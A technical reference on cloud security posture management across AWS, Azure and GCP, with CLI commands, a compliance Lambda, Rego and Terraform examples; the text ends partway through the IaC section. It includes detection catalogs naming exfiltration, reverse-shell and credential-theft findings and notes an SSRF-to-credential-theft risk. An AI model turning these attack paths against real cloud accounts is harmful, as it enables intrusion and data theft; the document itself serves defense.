# 38 — Cloud Security Posture Management (CSPM) e Cloud Infrastructure Security

> Documento tecnico enciclopedico per professionisti IT senior e penetration tester.
> Copre CSPM, sicurezza nativa AWS/Azure/GCP, IaC security, CIEM, compliance cloud e offensive cloud testing.
> **Aggiornamento:** 2026-05-07

---

## Indice

1. [Fondamenti CSPM](#1-fondamenti-cspm)
2. [AWS Security Posture](#2-aws-security-posture)
3. [Azure Security Posture](#3-azure-security-posture)
4. [GCP Security Posture](#4-gcp-security-posture)
5. [Multi-Cloud Security](#5-multi-cloud-security)
6. [Infrastructure as Code Security](#6-infrastructure-as-code-security)
7. [Cloud Identity Security — CIEM](#7-cloud-identity-security--ciem)
8. [Compliance Frameworks in Cloud](#8-compliance-frameworks-in-cloud)
9. [Cloud Penetration Testing](#9-cloud-penetration-testing)
10. [Laboratorio Pratico](#10-laboratorio-pratico)

---

## 1. Fondamenti CSPM

### 1.1 Cloud Misconfiguration as the Primary Breach Vector

Cloud misconfigurations remain the leading cause of cloud security breaches, accounting for approximately 65-70% of cloud-related incidents according to industry reports from Gartner, the Cloud Security Alliance, and Unit 42. The nature of the problem stems from a fundamental tension: cloud providers expose thousands of configurable parameters, and the default states of these parameters do not always align with organizational security requirements.

Common misconfiguration categories ranked by breach impact:

| Rank | Misconfiguration Class | Example | Typical Impact |
|------|----------------------|---------|----------------|
| 1 | Public data exposure | S3 bucket with ACL `public-read` | Data breach, regulatory penalty |
| 2 | Overprivileged identities | IAM role with `*:*` permissions | Account takeover, lateral movement |
| 3 | Missing encryption | EBS volumes without encryption at rest | Data exposure on disk theft/snapshot sharing |
| 4 | Unrestricted network access | Security Group allowing `0.0.0.0/0` on port 22 | Direct exploitation of services |
| 5 | Disabled logging | CloudTrail disabled in a region | Loss of forensic visibility |
| 6 | Default credentials | Default service account with broad permissions | Privilege escalation via metadata API |
| 7 | Unpatched services | Managed Kubernetes with outdated node images | Container breakout, CVE exploitation |

The root cause is not negligence; it is complexity. A single AWS account can have 300+ distinct service configurations. Organizations running 50-100 accounts across multiple regions face a configuration surface in the tens of thousands. Manual auditing is not viable at this scale; this is the gap CSPM fills.

### 1.2 Shared Responsibility Model — The Gap

Every major cloud provider operates under a shared responsibility model: the provider secures the infrastructure *of* the cloud, and the customer secures what they build *in* the cloud. The boundary shifts depending on the service model:

```
IaaS (EC2, Azure VMs, GCE):
  Provider: Physical host, hypervisor, network fabric, storage hardware
  Customer: OS patching, firewall rules, IAM, encryption, application security

PaaS (RDS, App Service, Cloud Run):
  Provider: OS patching, runtime updates, physical security
  Customer: Data classification, access control, network exposure, encryption config

SaaS (Office 365, Salesforce):
  Provider: Application patching, infrastructure, availability
  Customer: User access management, data sharing configuration, DLP
```

The critical gap exists at the boundary. Customers frequently misconfigure elements they own, assuming the provider handles them. Examples:

- Assuming S3 encryption is enabled by default (it was not until January 2023 for new buckets)
- Believing RDS instances are automatically network-isolated (they are not if placed in a public subnet with a public IP)
- Trusting that Azure Storage accounts reject public access by default (they did not until November 2023)

CSPM platforms exist specifically to audit this boundary continuously and flag deviations from secure baselines.

### 1.3 CSPM Market Landscape

The CSPM market has undergone significant consolidation, converging toward Cloud-Native Application Protection Platforms (CNAPP) that integrate multiple security capabilities:

| Vendor | Product | Key Differentiator | CNAPP Scope |
|--------|---------|-------------------|-------------|
| Palo Alto Networks | Prisma Cloud | Broadest coverage (CSPM+CWPP+CIEM+DSPM+CI/CD) | Full CNAPP |
| Wiz | Wiz Platform | Agentless architecture, identity graph, attack path analysis | Full CNAPP |
| Orca Security | Orca Platform | SideScanning technology, agentless deep inspection | Full CNAPP |
| Lacework | Lacework (FortiCNAPP) | Polygraph behavioral analytics, anomaly detection | Full CNAPP |
| Aqua Security | Aqua Platform | Strong container/K8s heritage, supply chain focus | Full CNAPP |
| CrowdStrike | Falcon Cloud Security | EDR+CSPM convergence, threat intel integration | CNAPP via acquisition |
| Microsoft | Defender for Cloud | Native Azure integration, multi-cloud support | Full CNAPP |
| AWS | Security Hub + native services | Deepest AWS integration, no agent needed | AWS-only CNAPP equivalent |
| Google | Security Command Center | Native GCP, compliance scanning, AI/ML threat detection | GCP-focused CNAPP |

**CNAPP convergence trend:** Standalone CSPM tools are disappearing. The market demands platforms that combine posture management with runtime protection (CWPP), identity analysis (CIEM), data security posture (DSPM), and CI/CD pipeline scanning. Gartner predicts that by 2027, 80% of enterprises will consolidate CWPP and CSPM into a single CNAPP vendor.

### 1.4 Continuous Compliance vs Point-in-Time Assessment

Traditional security assessments produce a snapshot: auditors evaluate controls at a specific moment, generate a report, and revisit months later. Cloud environments change constantly — a single `terraform apply` can create 50 resources in seconds. Point-in-time assessments miss:

- Resources created after the assessment date
- Configurations changed by automation or manual intervention
- Temporary misconfigurations that exist for hours before being corrected
- Shadow deployments in unmonitored regions or accounts

CSPM operates on continuous monitoring: agents or agentless scanners evaluate resource configurations on a recurring schedule (typically 1-24 hours) or in near-real-time via cloud provider event streams (CloudTrail, Azure Activity Log, GCP Audit Logs). Findings are generated immediately when a resource deviates from policy.

### 1.5 CSPM vs CWPP vs CASB vs CIEM — Component Relationships

These four pillars address different layers of cloud security:

```
                    ┌────────────────────────────────────────┐
                    │          CNAPP (Unified Platform)       │
                    ├──────────┬──────────┬────────┬─────────┤
                    │  CSPM    │  CWPP    │  CASB  │  CIEM   │
                    │          │          │        │         │
                    │ Configu- │ Workload │ SaaS   │ Identity│
                    │ ration   │ Runtime  │ Access │ Entitle-│
                    │ Audit    │ Protect  │ Broker │ ment    │
                    ├──────────┼──────────┼────────┼─────────┤
                    │ Scans    │ Agent on │Inline/ │ Analyzes│
                    │ cloud    │ VM/pod,  │API prox│ IAM     │
                    │ API for  │ detects  │gates   │policies,│
                    │ misconf  │ malware, │SaaS    │ finds   │
                    │ drift,   │ vuln     │usage,  │ over-   │
                    │ exposure │ exploits │DLP     │ privil. │
                    └──────────┴──────────┴────────┴─────────┘
```

| Component | Focus Area | Data Source | Output |
|-----------|-----------|-------------|--------|
| **CSPM** | Infrastructure configuration | Cloud provider APIs (describe/list calls) | Misconfigurations, compliance violations |
| **CWPP** | Runtime workload protection | Agent on host/container, eBPF probes | Malware, vulnerability exploitation, runtime anomalies |
| **CASB** | SaaS application governance | API integration or inline proxy | Shadow IT, data exfiltration, policy violations |
| **CIEM** | Identity and entitlement management | IAM policies, role assumptions, CloudTrail | Overprivileged identities, unused permissions, cross-account risk |

Understanding these boundaries prevents tool overlap and coverage gaps. A CSPM will detect that an S3 bucket is public but will not detect malware running inside an EC2 instance (CWPP territory). A CASB will detect unsanctioned SaaS usage but will not audit IAM role trust policies (CIEM territory).

---

## 2. AWS Security Posture

### 2.1 AWS Config Rules

AWS Config continuously records resource configuration changes and evaluates them against rules. Rules fall into two categories:

**Managed Rules** — Pre-built by AWS, covering common misconfigurations:

| Rule Name | Evaluates | Trigger |
|-----------|-----------|---------|
| `s3-bucket-public-read-prohibited` | S3 bucket ACLs and policies for public read | Configuration change |
| `s3-bucket-ssl-requests-only` | S3 bucket policy requires SSL | Configuration change |
| `iam-password-policy` | Account password policy meets standards | Periodic (24h) |
| `iam-root-access-key-check` | Root user has no access keys | Periodic |
| `encrypted-volumes` | EBS volumes are encrypted | Configuration change |
| `rds-instance-public-access-check` | RDS not publicly accessible | Configuration change |
| `restricted-ssh` | No SG allows unrestricted SSH | Configuration change |
| `cloudtrail-enabled` | CloudTrail is active | Periodic |
| `multi-region-cloudtrail-enabled` | CloudTrail covers all regions | Periodic |
| `vpc-flow-logs-enabled` | VPC has flow logs | Configuration change |

**Custom Rules** — Authored in AWS Lambda (Python, Node.js) or Guard DSL:

```python
# custom_config_rule.py — Checks EC2 instances have IMDSv2 enforced
import json
import boto3

def lambda_handler(event, context):
    config = boto3.client('config')
    invoking_event = json.loads(event['invokingEvent'])
    configuration_item = invoking_event['configurationItem']

    resource_type = configuration_item['resourceType']
    if resource_type != 'AWS::EC2::Instance':
        return

    configuration = configuration_item['configuration']
    metadata_options = configuration.get('metadataOptions', {})
    http_tokens = metadata_options.get('httpTokens', 'optional')

    compliance_type = 'COMPLIANT' if http_tokens == 'required' else 'NON_COMPLIANT'
    annotation = 'IMDSv2 enforced' if compliance_type == 'COMPLIANT' else 'IMDSv1 still enabled — SSRF risk'

    config.put_evaluations(
        Evaluations=[{
            'ComplianceResourceType': configuration_item['resourceType'],
            'ComplianceResourceId': configuration_item['resourceId'],
            'ComplianceType': compliance_type,
            'Annotation': annotation,
            'OrderingTimestamp': configuration_item['configurationItemCaptureTime']
        }],
        ResultToken=event['resultToken']
    )
```

Deploying via CLI:

```bash
# Enable AWS Config recorder
aws configservice put-configuration-recorder \
  --configuration-recorder name=default,roleARN=arn:aws:iam::123456789012:role/ConfigRole \
  --recording-group allSupported=true,includeGlobalResourceTypes=true

# Activate a managed rule
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "s3-bucket-public-read-prohibited",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"
  }
}'

# Check compliance
aws configservice get-compliance-details-by-config-rule \
  --config-rule-name s3-bucket-public-read-prohibited \
  --compliance-types NON_COMPLIANT
```

### 2.2 AWS Security Hub

Security Hub aggregates findings from multiple AWS security services and third-party tools into a normalized format (AWS Security Finding Format — ASFF). It enables centralized compliance monitoring against standards:

**Supported Standards:**

| Standard | Controls | Focus |
|----------|----------|-------|
| AWS Foundational Security Best Practices (FSBP) | 200+ | AWS-specific best practices |
| CIS AWS Foundations Benchmark v1.4/v3.0 | 60+ | CIS hardening |
| PCI DSS v3.2.1 | 30+ | Payment card data |
| NIST SP 800-53 Rev. 5 | 150+ | Federal compliance |

**Enabling and querying:**

```bash
# Enable Security Hub with CIS and FSBP standards
aws securityhub enable-security-hub \
  --enable-default-standards

# Get findings with severity
aws securityhub get-findings \
  --filters '{
    "SeverityLabel": [{"Value": "CRITICAL", "Comparison": "EQUALS"}],
    "ComplianceStatus": [{"Value": "FAILED", "Comparison": "EQUALS"}]
  }' \
  --max-items 10

# Aggregate findings by resource type
aws securityhub get-findings \
  --filters '{
    "ResourceType": [{"Value": "AwsS3Bucket", "Comparison": "EQUALS"}],
    "ComplianceStatus": [{"Value": "FAILED", "Comparison": "EQUALS"}]
  }'
```

**Cross-account aggregation:** Security Hub supports a delegated administrator model. A central security account aggregates findings from all member accounts in an AWS Organization, providing a single-pane-of-glass view.

### 2.3 GuardDuty — Threat Detection

GuardDuty analyzes VPC Flow Logs, DNS query logs, CloudTrail management events, S3 data events, EKS audit logs, RDS login events, and Lambda network activity to detect threats. It uses machine learning, anomaly detection, and threat intelligence feeds.

**Finding categories:**

| Category | Example Finding Types |
|----------|----------------------|
| Reconnaissance | `Recon:EC2/PortProbeUnprotectedPort`, `Recon:EC2/Portscan` |
| Unauthorized Access | `UnauthorizedAccess:IAMUser/MaliciousIPCaller`, `UnauthorizedAccess:EC2/TorClient` |
| Credential Exfiltration | `Stealth:IAMUser/CloudTrailLoggingDisabled`, `PenTest:IAMUser/KaliLinux` |
| Data Exfiltration | `Exfiltration:S3/MaliciousIPCaller`, `Exfiltration:S3/AnomalousBehavior` |
| Crypto Mining | `CryptoCurrency:EC2/BitcoinTool.B!DNS` |
| Kubernetes | `Kubernetes:MaliciousIPCaller`, `PrivilegeEscalation:Kubernetes/PrivilegedContainer` |
| Malware | `Execution:EC2/MaliciousFile`, `Trojan:EC2/DNSDataExfiltration` |

### 2.4 IAM Access Analyzer

IAM Access Analyzer performs two critical functions: **external access analysis** (identifies resources shared with external principals) and **unused access analysis** (identifies permissions granted but never used).

```bash
# Create an analyzer at organization level
aws accessanalyzer create-analyzer \
  --analyzer-name org-analyzer \
  --type ORGANIZATION

# List findings — resources accessible from outside the zone of trust
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:access-analyzer:us-east-1:123456789012:analyzer/org-analyzer \
  --filter '{"status": {"eq": ["ACTIVE"]}}'

# Generate a policy based on actual CloudTrail usage (unused access reduction)
aws accessanalyzer start-policy-generation \
  --policy-generation-details '{
    "principalArn": "arn:aws:iam::123456789012:role/AppRole",
    "cloudTrailDetails": {
      "trailArn": "arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail",
      "startTime": "2025-11-01T00:00:00Z",
      "endTime": "2026-05-01T00:00:00Z"
    }
  }'
```

### 2.5 Macie, Inspector, CloudTrail

**Amazon Macie** — Automated sensitive data discovery. Scans S3 buckets using machine learning to classify data (PII, credentials, financial data, health records). Generates findings when sensitive data is found in buckets with insufficient access controls.

**Amazon Inspector** — Continuous vulnerability scanning for EC2 instances, Lambda functions, and ECR container images. Uses an agent-based approach for EC2 and agentless for Lambda/ECR. Correlates CVEs with network reachability to prioritize findings with a risk score.

**AWS CloudTrail** — Management events (control plane API calls), data events (data plane calls to S3/Lambda/DynamoDB), and CloudTrail Insights (anomaly detection on management event volume). CloudTrail is the single most important audit and forensics source in AWS.

```bash
# Enable CloudTrail with data events for S3
aws cloudtrail create-trail \
  --name security-trail \
  --s3-bucket-name my-cloudtrail-logs \
  --is-multi-region-trail \
  --enable-log-file-validation

aws cloudtrail put-event-selectors --trail-name security-trail \
  --event-selectors '[{
    "ReadWriteType": "All",
    "IncludeManagementEvents": true,
    "DataResources": [{
      "Type": "AWS::S3::Object",
      "Values": ["arn:aws:s3"]
    }]
  }]'

aws cloudtrail start-logging --name security-trail
```

### 2.6 Common AWS Misconfigurations

| Misconfiguration | Risk | Detection | Remediation |
|-----------------|------|-----------|-------------|
| S3 bucket with public ACL | Data breach | Config rule `s3-bucket-public-read-prohibited` | Enable S3 Block Public Access at account level |
| Security Group allows 0.0.0.0/0 on SSH/RDP | Brute force, exploitation | Config rule `restricted-ssh` | Restrict to bastion CIDR or use SSM Session Manager |
| IAM role with `Action: "*", Resource: "*"` | Full account compromise | Access Analyzer, IAM policy simulator | Apply least-privilege using Access Analyzer policy generation |
| CloudTrail disabled in any region | Forensic blind spot | Config rule `multi-region-cloudtrail-enabled` | Enable organization-level trail with multi-region |
| EBS volumes unencrypted | Data exposure | Config rule `encrypted-volumes` | Enable default EBS encryption in account settings |
| IMDSv1 enabled on EC2 | SSRF-to-credential-theft | Custom Config rule (see 2.1) | Enforce IMDSv2 via instance metadata options |
| Root account with access keys | Full account compromise | Config rule `iam-root-access-key-check` | Delete root access keys, enable MFA |
| Default VPC in use | Flat network, no segmentation | Manual review | Delete default VPC, deploy purpose-built VPCs |

---

## 3. Azure Security Posture

### 3.1 Microsoft Defender for Cloud

Defender for Cloud (formerly Azure Security Center) is Microsoft's CNAPP offering. It operates in two tiers:

- **Free tier (Foundational CSPM):** Secure score, basic recommendations, continuous assessment of Azure resources
- **Defender CSPM plan:** Attack path analysis, agentless scanning, cloud security graph, governance rules, regulatory compliance dashboards

**Secure Score:** A 0-100% metric reflecting the organization's security posture. Each recommendation carries a weight. Implementing all recommendations yields 100%. Score components:

```
Secure Score = (Achieved Points / Maximum Points) * 100

Example:
  Maximum points: 230
  Points from completed controls: 184
  Secure Score: 184/230 = 80%
```

**Recommendation categories:**

| Category | Example Recommendations |
|----------|------------------------|
| Compute | Enable endpoint protection, apply system updates, enable disk encryption |
| Networking | Restrict access to management ports, enable DDoS protection, use NSGs |
| Data | Enable Transparent Data Encryption, configure auditing on SQL databases |
| Identity | Enable MFA for accounts with owner permissions, remove deprecated accounts |
| IoT | Resolve security recommendations for IoT devices |

```bash
# List Defender for Cloud recommendations via Azure CLI
az security assessment list \
  --query "[?status.code=='Unhealthy'].{Name:displayName, Resource:resourceDetails.id, Severity:metadata.severity}" \
  --output table

# Get secure score
az security secure-score list --output table

# Enable Defender for a specific resource type
az security pricing create \
  --name VirtualMachines \
  --tier Standard

# Enable Defender CSPM plan
az security pricing create \
  --name CloudPosture \
  --tier Standard
```

### 3.2 Azure Policy

Azure Policy is the enforcement engine for governance. Policies evaluate resource properties against rules and report compliance or deny non-compliant deployments.

**Architecture:**

```
Policy Definition  -->  Policy Assignment  -->  Compliance Evaluation
     (rule)              (scope: MG/Sub/RG)      (compliant/non-compliant)

Initiative (Policy Set) = Collection of Policy Definitions
  e.g., "CIS Microsoft Azure Foundations Benchmark 2.0"
        contains 150+ individual policy definitions
```

**Key built-in policies:**

| Policy | Effect | Purpose |
|--------|--------|---------|
| `Audit VMs that do not use managed disks` | Audit | Disk management hygiene |
| `Storage accounts should restrict network access` | Deny/Audit | Prevent public storage |
| `Require a tag on resources` | Deny | Cost allocation governance |
| `Deploy Diagnostic Settings for Key Vault` | DeployIfNotExists | Ensure logging |
| `Allowed locations` | Deny | Data sovereignty |
| `Kubernetes cluster should not allow privileged containers` | Deny/Audit | Container hardening |

**Custom policy example — enforce HTTPS on App Services:**

```json
{
  "mode": "Indexed",
  "policyRule": {
    "if": {
      "allOf": [
        {
          "field": "type",
          "equals": "Microsoft.Web/sites"
        },
        {
          "field": "Microsoft.Web/sites/httpsOnly",
          "notEquals": "true"
        }
      ]
    },
    "then": {
      "effect": "deny"
    }
  },
  "parameters": {}
}
```

```bash
# Assign a built-in initiative (CIS Benchmark)
az policy assignment create \
  --name "CIS-Azure-2.0" \
  --display-name "CIS Microsoft Azure Foundations Benchmark 2.0" \
  --policy-set-definition "/providers/Microsoft.Authorization/policySetDefinitions/06f19060-9e68-4070-92ca-f15cc126059e" \
  --scope "/subscriptions/SUBSCRIPTION_ID"

# Check compliance state
az policy state list \
  --filter "complianceState eq 'NonCompliant'" \
  --query "[].{Policy:policyDefinitionName, Resource:resourceId}" \
  --output table
```

### 3.3 Sentinel Integration

Microsoft Sentinel (cloud-native SIEM+SOAR) integrates with Defender for Cloud to correlate posture findings with security events. Defender for Cloud findings flow as security alerts into Sentinel, enabling:

- Correlation of misconfiguration alerts with actual exploitation attempts
- Automated playbooks that trigger remediation when a finding is detected
- Hunting queries that search for indicators related to misconfigured resources

Key data connectors for cloud posture monitoring: Azure Activity Log, Defender for Cloud alerts, Azure AD Sign-in Logs, Azure AD Audit Logs, Office 365 audit logs, Network Security Group flow logs.

### 3.4 Azure AD Identity Protection and Key Vault Security

**Azure AD (Entra ID) Identity Protection** detects identity-based risks:

| Risk Detection | Type | Example |
|---------------|------|---------|
| Leaked credentials | Offline | User credentials found in dark web breach dump |
| Anonymous IP address | Real-time | Sign-in from Tor exit node |
| Atypical travel | Offline | Sign-in from Rome then Tokyo within 30 minutes |
| Malware-linked IP | Offline | Sign-in from IP associated with botnet C2 |
| Unfamiliar sign-in properties | Real-time | First sign-in from a new country/device/browser |

**Key Vault security best practices:**

- Enable soft-delete and purge protection (prevent permanent key destruction)
- Use Azure RBAC for data plane operations (not legacy access policies)
- Enable diagnostic logging to Sentinel or Log Analytics
- Restrict network access via private endpoints
- Rotate keys and secrets on a defined schedule
- Monitor `SecretGet`, `SecretSet`, `KeySign` operations for anomalous patterns

### 3.5 Common Azure Misconfigurations

| Misconfiguration | Risk | Detection | Remediation |
|-----------------|------|-----------|-------------|
| Storage account allows public blob access | Data breach | Azure Policy `Storage accounts should disable public blob access` | Set `allowBlobPublicAccess: false` |
| NSG allows inbound from Any on port 3389 | RDP brute force | Defender for Cloud recommendation | Restrict to jump server IP or use Azure Bastion |
| Managed Identity assigned Contributor at subscription | Privilege escalation | CIEM tooling, access reviews | Scope to specific resource group and custom role |
| SQL Server allows all Azure services | Lateral movement | Defender for Cloud | Restrict to specific VNet subnets |
| Key Vault without purge protection | Permanent key destruction | Azure Policy | Enable purge protection |
| Activity Log not exported | Forensic gap | Azure Policy `Deploy Diagnostic Settings` | Export to Log Analytics workspace and storage account |
| Web App without HTTPS enforcement | MitM attack | Azure Policy (custom, see 3.2) | Set `httpsOnly: true` |

---

## 4. GCP Security Posture

### 4.1 Security Command Center (SCC)

Security Command Center is GCP's built-in CSPM and security analytics platform. It operates at two tiers:

- **Standard tier (free):** Asset inventory, security findings from built-in scanners, IAM misconfiguration detection
- **Premium tier:** Compliance monitoring (CIS, PCI, NIST), Event Threat Detection, Container Threat Detection, Virtual Machine Threat Detection, attack path simulation

**Built-in finding categories:**

| Scanner | Finding Examples |
|---------|-----------------|
| Security Health Analytics | Public bucket, open firewall, unencrypted disks, MFA not enforced, API keys unrestricted |
| Event Threat Detection | Suspicious IAM grants, anomalous data access, cryptocurrency mining, brute force SSH |
| Container Threat Detection | Reverse shell, malicious binary execution, malicious library loaded |
| VM Threat Detection | Cryptocurrency mining software on VM, kernel rootkit |
| Web Security Scanner | XSS, SQL injection, mixed content, outdated libraries (for App Engine/GKE ingress) |

**Interacting with SCC via gcloud:**

```bash
# List active high-severity findings
gcloud scc findings list organizations/ORG_ID \
  --filter="state=\"ACTIVE\" AND severity=\"HIGH\"" \
  --format="table(finding.category, finding.resourceName, finding.severity, finding.eventTime)"

# List findings for a specific source (Security Health Analytics)
gcloud scc findings list organizations/ORG_ID \
  --source="organizations/ORG_ID/sources/SOURCE_ID" \
  --filter="state=\"ACTIVE\""

# Mark a finding as muted (false positive)
gcloud scc findings update FINDING_ID \
  --organization=ORG_ID \
  --source=SOURCE_ID \
  --mute=MUTED
```

### 4.2 Cloud Asset Inventory

Cloud Asset Inventory provides a complete, searchable index of all GCP resources and their IAM policies across the organization hierarchy. It supports:

- **Asset search:** Find all resources of a type, in a project, with specific labels
- **IAM policy analysis:** Query who has access to what, analyze effective permissions
- **Change history:** Track resource configuration changes over time
- **Export:** Dump full asset inventory to BigQuery for custom analysis

```bash
# Search for all public Cloud Storage buckets
gcloud asset search-all-resources \
  --scope=organizations/ORG_ID \
  --asset-types=storage.googleapis.com/Bucket \
  --query="iamPolicy.bindings.members:allUsers OR iamPolicy.bindings.members:allAuthenticatedUsers"

# Analyze IAM policy — who can access a specific bucket
gcloud asset analyze-iam-policy \
  --organization=ORG_ID \
  --full-resource-name="//storage.googleapis.com/projects/_/buckets/my-bucket" \
  --output-group-edges
```

### 4.3 VPC Service Controls

VPC Service Controls create security perimeters around GCP services, preventing data exfiltration even by authorized users. They address scenarios where a compromised credential could copy data to an external project.

**Perimeter configuration concepts:**

| Component | Purpose |
|-----------|---------|
| Service perimeter | Boundary around projects and services |
| Access level | Conditions (IP, device, identity) that allow crossing the boundary |
| Ingress rule | Allows specific external access into the perimeter |
| Egress rule | Allows specific data movement out of the perimeter |
| Bridge | Connects two perimeters for cross-project communication |

A perimeter restricting BigQuery and Cloud Storage:

```bash
# Create an access policy
gcloud access-context-manager policies create \
  --organization=ORG_ID \
  --title="Corp Security Policy"

# Create a service perimeter
gcloud access-context-manager perimeters create secure-data \
  --policy=POLICY_ID \
  --title="Secure Data Perimeter" \
  --resources="projects/PROJECT_NUMBER_1,projects/PROJECT_NUMBER_2" \
  --restricted-services="bigquery.googleapis.com,storage.googleapis.com" \
  --access-levels="accessPolicies/POLICY_ID/accessLevels/corp-network"
```

### 4.4 Organization Policy Constraints

Organization policies enforce constraints across the GCP resource hierarchy (Organization > Folder > Project). Unlike IAM (who can do what), organization policies define what *can be done* regardless of who has permission.

**Critical constraints:**

| Constraint | Effect |
|-----------|--------|
| `constraints/compute.disableSerialPortAccess` | Block serial port access to VMs |
| `constraints/sql.restrictPublicIp` | Prevent Cloud SQL from having public IPs |
| `constraints/iam.disableServiceAccountKeyCreation` | Force workload identity, prevent key leakage |
| `constraints/compute.requireShieldedVm` | Enforce secure boot, vTPM, integrity monitoring |
| `constraints/storage.uniformBucketLevelAccess` | Prevent legacy ACLs on Cloud Storage |
| `constraints/gcp.resourceLocations` | Restrict resource deployment to specific regions |
| `constraints/compute.vmExternalIpAccess` | Control which VMs can have external IPs |

### 4.5 Binary Authorization and Chronicle

**Binary Authorization** enforces deploy-time security for GKE: only container images signed by trusted authorities (attestors) can be deployed. This prevents supply chain attacks where malicious images are pushed to a registry and deployed without review.

**Chronicle** (now Google Security Operations) is Google's cloud-native SIEM that ingests telemetry at petabyte scale. It correlates SCC findings with network, endpoint, and identity telemetry for threat detection and investigation. Chronicle uses YARA-L 2.0 for detection rules and provides an investigation timeline for incident response.

### 4.6 Common GCP Misconfigurations

| Misconfiguration | Risk | Detection | Remediation |
|-----------------|------|-----------|-------------|
| GCS bucket with `allUsers` or `allAuthenticatedUsers` | Data breach | SCC Security Health Analytics | Remove public members, enable uniform bucket-level access |
| Default compute service account with Editor role | Privilege escalation | Cloud Asset Inventory IAM analysis | Create custom service accounts with minimal permissions |
| VPC flow logs disabled | Forensic blind spot | SCC finding `VPC_FLOW_LOGS_DISABLED` | Enable flow logs on all subnets |
| Cloud SQL with public IP | SQL injection, brute force | Organization policy `sql.restrictPublicIp` | Use private IP + Cloud SQL Proxy |
| Service account key exported | Credential leakage | Organization policy `iam.disableServiceAccountKeyCreation` | Use workload identity federation |
| Firewall rule allows 0.0.0.0/0 on SSH | Brute force | SCC `OPEN_SSH_PORT` | Restrict to IAP tunnel range (35.235.240.0/20) |
| Shielded VM not enabled | Boot-level persistence | Organization policy | Enable Shielded VM on all instances |

---

## 5. Multi-Cloud Security

### 5.1 Unified Visibility Across Providers

Operating across AWS, Azure, and GCP simultaneously creates a visibility challenge: each provider has its own console, API structure, naming conventions, and security service ecosystem. The core problem is not lack of data; it is fragmentation. A security team monitoring three providers deals with:

- Three separate IAM systems with incompatible policy languages (JSON for AWS, JSON/Bicep for Azure, YAML for GCP)
- Three logging systems (CloudTrail, Azure Activity Log, Cloud Audit Logs) with different schemas
- Three networking models with different abstractions (VPC/Security Groups vs VNet/NSGs vs VPC/Firewall Rules)
- Different compliance baselines — a CIS benchmark for AWS differs from the Azure or GCP version in structure and control numbering

CNAPP platforms like Wiz, Prisma Cloud, and Orca address this by normalizing resource metadata into a unified graph. They map AWS EC2 instances, Azure VMs, and GCE instances into a common "compute instance" abstraction, then apply policies uniformly. However, this normalization introduces its own risks: provider-specific nuances can be lost. An Azure Managed Identity behaves differently from an AWS IAM role even though both represent "service identity."

For organizations unable or unwilling to adopt a commercial CNAPP, open-source alternatives exist:

| Tool | Multi-Cloud Support | Focus |
|------|-------------------|-------|
| Steampipe | AWS, Azure, GCP, 100+ plugins | SQL-based querying of cloud APIs |
| CloudQuery | AWS, Azure, GCP | Asset inventory to PostgreSQL/BigQuery |
| Prowler | AWS, Azure, GCP | Compliance auditing |
| ScoutSuite | AWS, Azure, GCP | Security posture assessment |
| Cartography | AWS, Azure, GCP | Neo4j-based asset graph |

### 5.2 Policy Normalization

Mapping security controls across providers requires a common language. CIS Benchmarks provide per-provider benchmarks, but no unified cross-cloud mapping. Organizations must build their own normalization layer, typically organized around control domains:

| Control Domain | AWS Implementation | Azure Implementation | GCP Implementation |
|---------------|-------------------|---------------------|-------------------|
| Encryption at Rest | KMS + default encryption | Azure Key Vault + service encryption | CMEK + default encryption |
| Network Segmentation | Security Groups + NACLs | NSGs + ASGs | Firewall Rules + VPC Service Controls |
| Logging | CloudTrail + VPC Flow Logs | Activity Log + NSG Flow Logs | Cloud Audit Logs + VPC Flow Logs |
| Secret Management | Secrets Manager / SSM Parameter Store | Key Vault | Secret Manager |
| Identity Federation | IAM Identity Center (SSO) | Entra ID (Azure AD) | Cloud Identity + Workforce Identity |
| Vulnerability Scanning | Inspector | Defender for Cloud (Qualys/MDVM) | SCC + Artifact Analysis |

This mapping becomes the foundation for a unified policy engine. Tools like Open Policy Agent (OPA) can evaluate resources from any provider against the same Rego policy:

```rego
# unified_encryption.rego — Checks storage encryption across providers
package cloud.storage.encryption

default compliant = false

# AWS S3
compliant {
    input.provider == "aws"
    input.resource_type == "aws_s3_bucket"
    input.server_side_encryption_configuration != null
}

# Azure Storage
compliant {
    input.provider == "azure"
    input.resource_type == "azurerm_storage_account"
    input.properties.encryption.services.blob.enabled == true
}

# GCP Cloud Storage
compliant {
    input.provider == "gcp"
    input.resource_type == "google_storage_bucket"
    input.encryption[_].default_kms_key_name != null
}

violation[msg] {
    not compliant
    msg := sprintf("Storage resource %s on %s is not encrypted with customer-managed key", [input.resource_name, input.provider])
}
```

### 5.3 Multi-Cloud Identity Management Challenges

Identity management across clouds is the hardest operational challenge. Each provider has its own identity store, policy language, and trust model. Cross-cloud identity patterns include:

**Federated Identity:** A single identity provider (Okta, Entra ID, Google Workspace) issues tokens accepted by all three clouds. This centralizes authentication but does not centralize authorization — each cloud maintains its own permission model.

**Service-to-Service Authentication:** An application in AWS calling a GCP API needs identity bridging. Options include:

1. **Workload Identity Federation (GCP):** AWS IAM roles can assume GCP service account identities without exporting keys
2. **Azure Federated Credentials:** GitHub Actions or other OIDC providers can authenticate to Azure without secrets
3. **AWS STS AssumeRoleWithWebIdentity:** External OIDC tokens are exchanged for temporary AWS credentials

**Risks unique to multi-cloud identity:**

- Privilege escalation chains that cross cloud boundaries (Azure AD Global Admin creates AWS IAM admin)
- Stale cross-cloud trusts — an Azure AD tenant that no longer exists still trusted by AWS
- Inconsistent MFA enforcement — required in AWS but not for the same user in GCP
- Different session duration defaults — AWS defaults to 1 hour, Azure to 24 hours for tokens

### 5.4 Terraform and Pulumi for Consistent Security Posture

Infrastructure as Code (IaC) provides the primary mechanism for achieving consistent security posture across clouds. By defining infrastructure declaratively, security properties become auditable, version-controlled, and repeatable.

```hcl
# modules/secure-storage/aws/main.tf
resource "aws_s3_bucket" "secure" {
  bucket = var.bucket_name

  tags = {
    SecurityLevel = "high"
    ManagedBy     = "terraform"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "secure" {
  bucket = aws_s3_bucket.secure.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = var.kms_key_id
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "secure" {
  bucket                  = aws_s3_bucket.secure.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

